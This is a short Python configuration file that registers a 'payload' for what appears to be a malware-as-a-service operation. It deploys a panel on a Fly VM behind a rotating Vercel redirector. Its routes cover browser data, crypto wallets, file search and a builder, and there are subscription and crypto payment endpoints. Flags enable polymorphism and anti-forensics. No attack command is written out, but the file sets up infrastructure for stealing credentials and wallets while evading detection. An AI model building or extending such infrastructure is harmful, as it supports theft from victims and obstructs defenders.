# payloads_config.py — Operator defines what payloads to deploy each cycle

from core.payload_registry import PayloadRegistry, PayloadDefinition

def build_registry() -> PayloadRegistry:
    reg = PayloadRegistry()

    # --- Telemetry platform: flipper (full-stack app on Fly VM) ---
    #     Express backend + React frontend + embedded Postgres + nginx
    #     Served behind a Vercel redirector that proxies all routes to the Fly VM
    reg.add(PayloadDefinition(
        id="flipper-telemetry",
        payload_type="telemetry_platform",
        serve_on="both",                    # Vercel redirector + Fly VM app
        docker_image="registry.fly.io/chimera-flipper:latest",
        vm_memory_mb=1024,                  # flipper needs more than 512MB
        vm_machine_type="shared-cpu-2x",
        api_routes=[
            "/auth", "/dashboard", "/admin", "/subscription",
            "/payment", "/builder", "/api/browser", "/api/wallets",
            "/api/filesearch", "/api/asar", "/api/search"
        ],
        auth_method="session_key",
        polymorphic=True,
        anti_forensic=True,
        custom_config={
            "session_secret": "ROTATE_PER_CYCLE",   # set by rotation engine
            "oxapay_merchant_key": "sandbox",         # operator sets in config.yaml
            "base_url": "ROTATE_PER_CYCLE",           # set to Vercel URL per cycle
        }
    ))

    return reg
